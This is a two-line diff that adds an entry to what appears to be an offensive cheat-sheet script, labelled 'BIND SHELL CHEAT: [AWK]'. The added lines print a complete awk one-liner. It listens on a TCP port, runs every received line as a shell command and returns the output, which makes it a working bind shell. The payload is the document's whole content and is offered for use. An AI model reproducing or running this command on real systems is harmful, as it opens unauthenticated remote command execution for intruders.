@@ -1,0 +1,2 @@
+echo -e "\033[31m\033[1mBIND SHELL CHEAT: [AWK]\033[m"
+echo -e "\t\033[1mawk 'BEGIN{s=\"/inet/tcp/$PORT/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'\033[m"
